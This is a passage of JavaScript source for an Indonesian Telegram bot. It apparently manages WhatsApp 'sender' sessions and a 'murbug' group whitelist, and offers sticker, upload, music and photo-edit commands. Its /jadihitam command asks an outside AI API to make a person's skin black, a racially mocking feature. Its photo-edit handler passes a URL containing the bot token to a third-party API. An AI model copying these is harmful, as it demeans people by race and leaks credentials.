      murbugGC.push(idgc);
      saveMurbugGC();
      return bot.sendMessage(chatId,
        `<blockquote>✅ ɢʀᴜᴘ ɪɴɪ ʙᴇʀʜᴀsɪʟ ᴅɪᴛᴀᴍʙᴀʜᴋᴀɴ ᴋᴇ ᴡʜɪᴛᴇʟɪsᴛ ᴍᴜʀʙᴜɢ!</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
            ]
          }
        }
      );
    }

    if (arg === 'off') {
      if (!isActive) {
        return bot.sendMessage(chatId,
          `<blockquote>⚠️ ɢʀᴜᴘ ɪɴɪ sᴇᴅᴀɴɢ ᴛɪᴅᴀᴋ ᴀᴋᴛɪꜰ ᴍᴏᴅᴇ ᴍᴜʀʙᴜɢ</blockquote>`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
              ]
            }
          }
        );
      }
      murbugGC = murbugGC.filter(g => g !== idgc);
      saveMurbugGC();
      return bot.sendMessage(chatId,
        `<blockquote>❌ ɢʀᴜᴘ ɪɴɪ ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs ᴅᴀʀɪ ᴡʜɪᴛᴇʟɪsᴛ ᴍᴜʀʙᴜɢ!</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
            ]
          }
        }
      );
    }

    const statusText = isActive ? "ᴏɴʟɪɴᴇ ✅" : "ᴏғғʟɪɴᴇ ❌";
    const messageText = 
`<blockquote>📌 ᴍᴏᴅᴇ ᴍᴜʀʙᴜɢ ᴅɪ ɢʀᴜᴘ ɪɴɪ: <b>${statusText}</b>

━━━━━━━━━━━━━━━━
💡 <b>ᴄᴀʀᴀ ᴘᴇɴɢɢᴜɴᴀᴀɴ:</b>

/modemurbuggb on  → ᴍᴇɴɢᴀᴋᴛɪꜰᴋᴀɴ ᴍᴏᴅᴇ ᴍᴜʀʙᴜɢ
/modemurbuggb off → ᴍᴇɴᴏɴᴀᴋᴛɪꜰᴋᴀɴ ᴍᴏᴅᴇ ᴍᴜʀʙᴜɢ
━━━━━━━━━━━━━━━━</blockquote>`;

    await bot.sendMessage(chatId, messageText, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
        ]
      }
    });

  } catch (error) {
    console.error("Error /modemurbuggb:", error);
    bot.sendMessage(chatId,
      `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ, ᴄᴏʙᴀ ʟᴀɢɪ ɴᴀɴᴛɪ.</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }
});

bot.onText(/\/addprem(?:\s(.+))?/i, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(msg.from.id) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(
            chatId,
            `<blockquote><b>ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴀᴄᴄsᴇs ᴏʟᴇʜ ᴏᴡɴᴇʀ</b></blockquote>`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
                    ]
                }
            }
        );
    }

    if (!match[1]) {
        return bot.sendMessage(
            chatId,
            `<blockquote><b>[!] ᴍɪssɪɴɢ ɪɴᴘᴜᴛ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴜsᴇʀ ɪᴅ.\nᴇxᴀᴍᴘʟᴇ : /ᴀᴅᴅᴘʀᴇᴍ 𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿</b></blockquote>`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
                    ]
                }
            }
        );
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(
            chatId,
            `<blockquote><b>[!] ɪɴᴠᴀʟɪᴅ ɪɴᴘᴜᴛ. ᴇxᴀᴍᴘʟᴇ: /addprem 6843967527.</b></blockquote>`,
            { parse_mode: "HTML" }
        );
    }

    if (!premiumUsers.includes(userId)) {
        premiumUsers.push(userId);
        savePremiumUsers();
        console.log(`${senderId} Added ${userId} To Premium`);
        bot.sendMessage(
            chatId,
            `<blockquote><b>[✓] ᴜsᴇʀ ${userId} ʜᴀs ʙᴇᴇɴ ᴀᴅᴅᴇᴅ ᴛᴏ ᴛʜᴇ ᴘʀᴇᴍɪᴜᴍ ʟɪsᴛ.</b></blockquote>`,
            { parse_mode: "HTML" }
        );
    } else {
        bot.sendMessage(
            chatId,
            `<blockquote><b>[!] ᴜsᴇʀ ${userId} ɪs ᴀʟʀᴇᴀᴅʏ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ.</b></blockquote>`,
            { parse_mode: "HTML" }
        );
    }
});
  
bot.onText(/\/addowner(?:\s(.+))?/i, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            `<blockquote><b>ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴀᴄᴄsᴇs ᴏʟᴇʜ ᴏᴡɴᴇʀ</b></blockquote>`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
                    ]
                }
            }
        );
    }

    if (!match[1]) {
        return bot.sendMessage(
            chatId,
            `<blockquote><b>[!] ᴍɪssɪɴɢ ɪɴᴘᴜᴛ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴜsᴇʀ ɪᴅ.\nᴇxᴀᴍᴘʟᴇ : /ᴀᴅᴅᴏᴡɴᴇʀ 𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿</b></blockquote>`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
                    ]
                }
            }
        );
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(
            chatId,
            `<blockquote><b>[!] ɪɴᴠᴀʟɪᴅ ɪɴᴘᴜᴛ. ᴇxᴀᴍᴘʟᴇ: /addowner 6843967527.</b></blockquote>`,
            { parse_mode: "HTML" }
        );
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(
            chatId,
            `<blockquote><b>[✓] ᴜsᴇʀ ${userId} ʜᴀs ʙᴇᴇɴ ᴀᴅᴅᴇᴅ ᴀs ᴀɴ ᴀᴅᴍɪɴ.</b></blockquote>`,
            { parse_mode: "HTML" }
        );
    } else {
        bot.sendMessage(
            chatId,
            `<blockquote><b>[!] ᴜsᴇʀ ${userId} ɪs ᴀʟʀᴇᴀᴅʏ ᴀɴ ᴀᴅᴍɪɴ.</b></blockquote>`,
            { parse_mode: "HTML" }
        );
    }
});

bot.onText(/\/delprem(?:\s(.+))?/i, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (!isOwner(msg.from.id) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(
            chatId,
            `<blockquote><b>ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴀᴄᴄsᴇs ᴏʟᴇʜ ᴏᴡɴᴇʀ</b></blockquote>`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
                    ]
                }
            }
        );
    }

    if (!match[1]) {
        return bot.sendMessage(
            chatId,
            `<blockquote><b>[!] ᴍɪssɪɴɢ ɪɴᴘᴜᴛ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴜsᴇʀ ɪᴅ.\nᴇxᴀᴍᴘʟᴇ : /ᴅᴇʟᴘʀᴇᴍ 𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿</b></blockquote>`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
                    ]
                }
            }
        );
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (premiumUsers.includes(userId)) {
        premiumUsers = premiumUsers.filter(id => id !== userId);
        savePremiumUsers();
        console.log(`${senderId} Deleted ${userId} From Premium`);
        bot.sendMessage(
            chatId,
            `<blockquote><b>[✓] ᴜsᴇʀ ${userId} ʜᴀs ʙᴇᴇɴ ʀᴇᴍᴏᴠᴇᴅ ғʀᴏᴍ ᴛʜᴇ ᴘʀᴇᴍɪᴜᴍ ʟɪsᴛ.</b></blockquote>`,
            { parse_mode: "HTML" }
        );
    } else {
        bot.sendMessage(
            chatId,
            `<blockquote><b>[!] ᴜsᴇʀ ${userId} ɪs ɴᴏᴛ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ.</b></blockquote>`,
            { parse_mode: "HTML" }
        );
    }
});

bot.onText(/\/delowner(?:\s(.+))?/i, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (!isOwner(msg.from.id) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(
            chatId,
            `<blockquote><b>ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴀᴄᴄsᴇs ᴏʟᴇʜ ᴏᴡɴᴇʀ</b></blockquote>`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
                    ]
                }
            }
        );
    }

    if (!match[1]) {
        return bot.sendMessage(
            chatId,
            `<blockquote><b>[!] ᴍɪssɪɴɢ ɪɴᴘᴜᴛ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴜsᴇʀ ɪᴅ.\nᴇxᴀᴍᴘʟᴇ : /ᴅᴇʟᴏᴡɴᴇʀ 𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿</b></blockquote>`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
                    ]
                }
            }
        );
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (adminUsers.includes(userId)) {
        adminUsers = adminUsers.filter(id => id !== userId);
        saveAdminUsers();
        console.log(`${senderId} Deleted ${userId} From Admin`);
        bot.sendMessage(
            chatId,
            `<blockquote><b>[✓] ᴜsᴇʀ ${userId} ʜᴀs ʙᴇᴇɴ ʀᴇᴍᴏᴠᴇᴅ ғʀᴏᴍ ᴛʜᴇ ᴀᴅᴍɪɴ ʟɪsᴛ.</b></blockquote>`,
            { parse_mode: "HTML" }
        );
    } else {
        bot.sendMessage(
            chatId,
            `<blockquote><b>[!] ᴜsᴇʀ ${userId} ɪs ɴᴏᴛ ᴀɴ ᴀᴅᴍɪɴ.</b></blockquote>`,
            { parse_mode: "HTML" }
        );
    }
});

bot.onText(/\/listprem/, (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(msg.from.id) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(
            chatId,
            `<blockquote><b>ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴀᴄᴄsᴇs ᴏʟᴇʜ ᴏᴡɴᴇʀ</b></blockquote>`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
                    ]
                }
            }
        );
    }

    const premiumList = premiumUsers
        .map((id, index) => `${index + 1}. ${id}`)
        .join("\n");

    bot.sendMessage(
        chatId,
        `<blockquote><b>ᴅᴀғᴛᴀʀ ᴘᴇɴɢɢᴜɴᴀ ᴘʀᴇᴍɪᴜᴍ:</b>\n${premiumList || "ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴘᴇɴɢɢᴜɴᴀ ᴘʀᴇᴍɪᴜᴍ."}</blockquote>`,
        { parse_mode: "HTML" }
    );
});

bot.onText(/\/listowner/, (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(msg.from.id) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(
            chatId,
            `<blockquote><b>ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴀᴄᴄsᴇs ᴏʟᴇʜ ᴏᴡɴᴇʀ</b></blockquote>`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
                    ]
                }
            }
        );
    }

    const adminList = adminUsers
        .map((id, index) => `${index + 1}. ${id}`)
        .join("\n");

    bot.sendMessage(
        chatId,
        `<blockquote><b>ᴅᴀғᴛᴀʀ ᴀᴅᴍɪɴ:</b>\n${adminList || "ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴀᴅᴍɪɴ."}</blockquote>`,
        { parse_mode: "HTML" }
    );
});

bot.onText(/^\/info(\s|$)/i, async (msg) => {
  const user = msg.from;
  const fullName = [user.first_name, user.last_name].filter(Boolean).join(" ");
  const usernameText = user.username ? `@${user.username}` : "ᴛɪᴅᴀᴋ ᴀᴅᴀ";
  const profileUrl = user.username ? `https://t.me/${user.username}` : `tg://openmessage?user_id=${user.id}`;

  const text = `<blockquote>ɪɴғᴏ ᴘᴇɴɢɢᴜɴᴀ</blockquote>
• ɴᴀᴍᴀ: ${fullName}
• ᴜsᴇʀɴᴀᴍᴇ: ${usernameText}
• ɪᴅ: <code>${user.id}</code>`;

  bot.sendMessage(msg.chat.id, text, {
    parse_mode: 'HTML',
    reply_to_message_id: msg.message_id,
    reply_markup: {
      inline_keyboard: [
        [{ text: "ᴘʀᴏғɪʟ ᴛᴇʟᴇɢʀᴀᴍ", url: profileUrl, style: "success", icon_custom_emoji_id: "5316887736823591263" }]
      ]
    }
  });
});

bot.onText(/\/(listsender|listsenderpublic|listsenderprivat|devices)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderid = msg.from.id;
  const command = match[1];

  if (!adminUsers.includes(senderid) && !isOwner(senderid)) {
    return resricted(msg.from.id); // sesuaikan dengan fungsi pembatas akses kamu
  }

  try {
    let filterType = "all";
    if (command === "listsenderpublic") filterType = "public";
    if (command === "listsenderprivat") filterType = "private";

    let usageInfo = `<blockquote><b>╭─────────────────
│  ᴄᴀʀᴀ ᴘᴇɴɢɢᴜɴᴀᴀɴ
│────────────────
│ ғᴜɴɢsɪ: ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇɴᴅᴇʀ ᴡʜᴀᴛsᴀᴘᴘ (${filterType.toUpperCase()}).
│ ᴄᴏᴍᴍᴀɴᴅ: <code>/listsenderpublic</code> | <code>/listsenderprivat</code>
╰─────────────────</b></blockquote>\n\n`;

    const filteredSessions = Array.from(sessions.entries()).filter(([_, data]) => {
      if (filterType === "all") return true;
      return data.type === filterType;
    });

    if (filteredSessions.length === 0) {
      return bot.sendMessage(
        chatId,
        usageInfo + `<blockquote><b>[!] ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇɴᴅᴇʀ ${filterType.toUpperCase()} ʏᴀɴɢ ᴛᴇʀʜᴜʙᴜɴɢ.</b></blockquote>`,
        { parse_mode: "HTML" }
      );
    }

    let botList = usageInfo + `<blockquote>╭─────────────────\n│    <b>ᴅᴀғᴛᴀʀ sᴇɴᴅᴇʀ (${filterType.toUpperCase()})</b>    \n│────────────────\n`;
    let index = 1;

    for (const [botNumber, data] of filteredSessions) {
      const sock = data.sock;
      const type = data.type ? data.type.toUpperCase() : "PUBLIC";
      const status = sock?.user ? "ᴛᴇʀʜᴜʙᴜɴɢ" : "ᴛɪᴅᴀᴋ ᴛᴇʀʜᴜʙᴜɴɢ";
      const owner = data.ownerId ? `ᴏᴡɴᴇʀ: ${data.ownerId}` : "ᴏᴡɴᴇʀ: ᴛɪᴅᴀᴋ ᴅɪᴋᴇᴛᴀʜᴜɪ";

      botList += `│ ${index}. ${botNumber}\n│    ᴛʏᴘᴇ: ${type}\n│    ${owner}\n│    sᴛᴀᴛᴜs: ${status}\n│\n`;
      index++;
    }

    botList += `│ ᴛᴏᴛᴀʟ: ${filteredSessions.length} sᴇɴᴅᴇʀ\n╰─────────────────</blockquote>`;

    await bot.sendMessage(chatId, botList, { parse_mode: "HTML" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "<blockquote><b>[!] ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ sᴀᴀᴛ ᴍᴇɴɢᴀᴍʙɪʟ ᴅᴀғᴛᴀʀ sᴇɴᴅᴇʀ. sɪʟᴀᴋᴀɴ ᴄᴏʙᴀ ʟᴀɢɪ.</b></blockquote>",
      { parse_mode: "HTML" }
    );
  }
});
//================================================//
bot.onText(/^\/brat(?:\s+(.+))?$/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const text = match?.[1];

    if (!text) {
        return bot.sendMessage(
            chatId,
            `<blockquote>❌ ᴄᴏɴᴛᴏʜ :</blockquote>

<blockquote>/ʙʀᴀᴛ ʜᴀʟᴏ ʙᴀɴɢ</blockquote>`,
            {
                parse_mode: "HTML",
                reply_to_message_id: msg.message_id
            }
        );
    }

    const loading = await bot.sendMessage(
        chatId,
        `<blockquote>⏳ ᴍᴇᴍʙᴜᴀᴛ sᴛɪᴄᴋᴇʀ ʙʀᴀᴛ...</blockquote>`,
        {
            parse_mode: "HTML",
            reply_to_message_id: msg.message_id
        }
    );

    try {
        const url = `https://api-mininxd.vercel.app/brat?txt=${encodeURIComponent(text)}`;

        const res = await axios.get(url, {
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(res.data);

        await bot.sendSticker(chatId, buffer, {
            reply_to_message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "ᴄʀᴇᴀᴛᴏʀ",
                            url: "https://t.me/heysaka",
                            style: "success",
                            icon_custom_emoji_id: "5319301933645707826"
                        }
                    ]
                ]
            }
        });

        await bot.deleteMessage(
            chatId,
            loading.message_id
        );

    } catch (err) {
        console.error(
            "BRAT ERROR:",
            err.response?.status,
            err.message
        );

        try {
            await bot.deleteMessage(
                chatId,
                loading.message_id
            );
        } catch {}

        await bot.sendMessage(
            chatId,
            `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇᴍʙᴜᴀᴛ sᴛɪᴄᴋᴇʀ ʙʀᴀᴛ.</blockquote>`,
            {
                parse_mode: "HTML",
                reply_to_message_id: msg.message_id
            }
        );
    }
});

bot.onText(/^\/tourl$/i, async (msg) => {
    const chatId = msg.chat.id;
    const reply = msg.reply_to_message;

    if (!reply || (!reply.photo && !reply.video && !reply.document)) {
        return bot.sendMessage(
            chatId,
            `<blockquote>❌ ʀᴇᴘʟʏ ғᴏᴛᴏ, ᴠɪᴅᴇᴏ, ᴀᴛᴀᴜ ғɪʟᴇ ᴅᴇɴɢᴀɴ ᴄᴏᴍᴍᴀɴᴅ : /ᴛᴏᴜʀʟ</blockquote>`,
            {
                parse_mode: "HTML",
                reply_to_message_id: msg.message_id
            }
        );
    }

    try {

        const processingMsg = await bot.sendMessage(
            chatId,
            `<blockquote>⏳ sᴇᴅᴀɴɢ ᴍᴇɴɢᴜᴘʟᴏᴀᴅ ғɪʟᴇ...</blockquote>`,
            {
                parse_mode: "HTML",
                reply_to_message_id: msg.message_id
            }
        );

        const fileId = reply.photo
            ? reply.photo[reply.photo.length - 1].file_id
            : (reply.video?.file_id || reply.document?.file_id);

        const file = await bot.getFile(fileId);

        const fileUrl =
            `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`;

        const responseFile = await axios.get(fileUrl, {
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(responseFile.data);

        const fileName =
            file.file_path.split("/").pop() || "file";

        const form = new FormData();

        form.append(
            "files[]",
            buffer,
            fileName
        );

        const { data } = await axios.post(
            "https://uguu.se/upload.php",
            form,
            {
                headers: form.getHeaders()
            }
        );

        const finalUrl = data?.files?.[0]?.url;

        if (!finalUrl) {
            throw new Error("ɢᴀɢᴀʟ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴜʀʟ");
        }

        await bot.editMessageText(
`<blockquote>✅ ᴜᴘʟᴏᴀᴅ ʙᴇʀʜᴀsɪʟ!</blockquote>

<blockquote>🔗 ${finalUrl}</blockquote>`,
        {
            chat_id: chatId,
            message_id: processingMsg.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "ᴄᴏᴘʏ",
                            style: "success",
                            copy_text: {
                                text: finalUrl
                            }
                        },
                        {
                            text: "ᴄʀᴇᴀᴛᴏʀ",
                            url: "https://t.me/heysaka",
                            style: "success",
                            icon_custom_emoji_id: "5319301933645707826"
                        }
                    ]
                ]
            }
        });

    } catch (err) {

        console.error("Tourl Error:", err);

        bot.sendMessage(
            chatId,
            `<blockquote>❌ ɢᴀɢᴀʟ :</blockquote>

<blockquote>${err.response?.data?.error || err.message}</blockquote>`,
            {
                parse_mode: "HTML",
                reply_to_message_id: msg.message_id
            }
        );
    }
});

bot.onText(/^\/play(?:\s+(.+))?$/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const query = match[1] ? match[1].trim() : "";

    if (!query) {
        return bot.sendMessage(
            chatId,
            `<blockquote>⚠️ ᴍᴀsᴜᴋᴋᴀɴ ᴊᴜᴅᴜʟ ᴀᴛᴀᴜ ᴜʀʟ ʏᴏᴜᴛᴜʙᴇ.</blockquote>

<blockquote>ᴄᴏɴᴛᴏʜ :</blockquote>

<blockquote>/ᴘʟᴀʏ ʀᴇᴡʀɪᴛᴇ ᴛʜᴇ sᴛᴀʀs</blockquote>`,
            {
                parse_mode: "HTML",
                reply_to_message_id: msg.message_id
            }
        );
    }

    const waitMsg = await bot.sendMessage(
        chatId,
        `<blockquote>🔍 sᴇᴅᴀɴɢ ᴍᴇɴᴄᴀʀɪ ʟᴀɢᴜ...</blockquote>`,
        {
            parse_mode: "HTML",
            reply_to_message_id: msg.message_id
        }
    );

    try {
        await bot.sendChatAction(chatId, "upload_document");

        const apiUrl = `https://api.ikyyxd.my.id/search/ytplayv2?q=${encodeURIComponent(query)}`;
        const { data } = await axios.get(apiUrl, {
            timeout: 30000
        });

        if (!data || !data.status || !data.result) {
            return bot.editMessageText(
                `<blockquote>❌ ʟᴀɢᴜ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ.</blockquote>`,
                {
                    chat_id: chatId,
                    message_id: waitMsg.message_id,
                    parse_mode: "HTML"
                }
            );
        }

        const res = data.result;

        const artistName = "Heysaka Official ID";

        const durationMin = Math.floor((res.duration || 0) / 60);
        const durationSec = ((res.duration || 0) % 60)
            .toString()
            .padStart(2, "0");
        const durationFormatted = `${durationMin}:${durationSec}`;

        await bot.editMessageText(
            `<blockquote>📥 sᴇᴅᴀɴɢ ᴍᴇɴɢᴜɴᴅᴜʜ ᴀᴜᴅɪᴏ...</blockquote>`,
            {
                chat_id: chatId,
                message_id: waitMsg.message_id,
                parse_mode: "HTML"
            }
        ).catch(() => {});

        const audioUrl = res.audio ? res.audio.url : res.url;

        const audioStream = await axios.get(audioUrl, {
            responseType: "arraybuffer",
            timeout: 60000,
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
            }
        });

        const audioBuffer = Buffer.from(audioStream.data);

        await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});

        const caption =
`<blockquote>${res.title}</blockquote>

<blockquote>${artistName}</blockquote>

<blockquote>⏱ ${durationFormatted}</blockquote>`;

        if (res.thumbnail) {
            await bot.sendPhoto(chatId, res.thumbnail, {
                caption,
                parse_mode: "HTML",
                reply_to_message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "ᴠɪᴇᴡ ᴠɪᴅᴇᴏ",
                                style: "danger",
                                icon_custom_emoji_id: "5316567469702264826",
                                url: res.source || res.url
                            }
                        ],
                        [
                            {
                                text: "ᴄʀᴇᴀᴛᴏʀ",
                                url: "https://t.me/heysaka",
                                style: "success",
                                icon_custom_emoji_id: "5319301933645707826"
                            }
                        ]
                    ]
                }
            }).catch(() => {});
        }

        await bot.sendAudio(
            chatId,
            audioBuffer,
            {
                title: res.title,
                performer: artistName,
                duration: res.duration,
                reply_to_message_id: msg.message_id
            },
            {
                filename: `${res.title || "audio"}.mp3`,
                contentType: "audio/mpeg"
            }
        );

    } catch (error) {
        console.error("Error /play command:", error.message);

        await bot.editMessageText(
            `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇᴍᴘʀᴏsᴇs ᴘᴇʀᴍɪɴᴛᴀᴀɴ.</blockquote>

<blockquote>sɪʟᴀʜᴋᴀɴ ᴄᴏʙᴀ ʟᴀɢɪ ɴᴀɴᴛɪ.</blockquote>`,
            {
                chat_id: chatId,
                message_id: waitMsg.message_id,
                parse_mode: "HTML"
            }
        ).catch(() => {
            bot.sendMessage(
                chatId,
                `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇᴍᴘʀᴏsᴇs ᴘᴇʀᴍɪɴᴛᴀᴀɴ.</blockquote>`,
                {
                    parse_mode: "HTML",
                    reply_to_message_id: msg.message_id
                }
            );
        });
    }
});

bot.onText(/^\/jadihitam$/i, async (msg) => {
    try {
        const chatId = msg.chat.id;
        const reply = msg.reply_to_message;

        if (!reply || !reply.photo) {
            return bot.sendMessage(
                chatId,
                `<blockquote>❌ ʀᴇᴘʟʏ sᴇʙᴜᴀʜ ɢᴀᴍʙᴀʀ.</blockquote>

<blockquote>ᴄᴏɴᴛᴏʜ :</blockquote>

<blockquote>ʀᴇᴘʟʏ ғᴏᴛᴏ ᴋᴇᴍᴜᴅɪᴀɴ ᴋɪʀɪᴍ /ᴊᴀᴅɪʜɪᴛᴀᴍ</blockquote>`,
                {
                    parse_mode: "HTML",
                    reply_to_message_id: msg.message_id
                }
            );
        }

        const fileId = reply.photo[reply.photo.length - 1].file_id;
        const file = await bot.getFile(fileId);
        const fileUrl = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`;

        const loading = await bot.sendMessage(
            chatId,
            `<blockquote>⏳ sᴇᴅᴀɴɢ ᴍᴇᴍᴘʀᴏsᴇs ɢᴀᴍʙᴀʀ...</blockquote>`,
            {
                parse_mode: "HTML",
                reply_to_message_id: msg.message_id
            }
        );

        const { data } = await axios.get(
            "https://api.ikyyxd.my.id/edit/nanobananav3",
            {
                params: {
                    prompt: "ubahkan kulit nya menjadi hitam",
                    url: fileUrl
                }
            }
        );

        if (!data.status) {
            return bot.editMessageText(
                `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇᴍᴘʀᴏsᴇs ɢᴀᴍʙᴀʀ.</blockquote>`,
                {
                    chat_id: chatId,
                    message_id: loading.message_id,
                    parse_mode: "HTML"
                }
            );
        }

        await bot.deleteMessage(chatId, loading.message_id).catch(() => {});

        bot.sendPhoto(chatId, data.result.result_url, {
            caption: `<blockquote>✅ ʙᴇʀʜᴀsɪʟ ᴍᴇɴɢᴜʙᴀʜ ғᴏᴛᴏ ᴍᴇɴᴊᴀᴅɪ ɪʀᴇɴɢ.</blockquote>`,
            parse_mode: "HTML",
            reply_to_message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "ᴄʀᴇᴀᴛᴏʀ",
                            url: "https://t.me/heysaka",
                            style: "success",
                            icon_custom_emoji_id: "5319301933645707826"
                        }
                    ]
                ]
            }
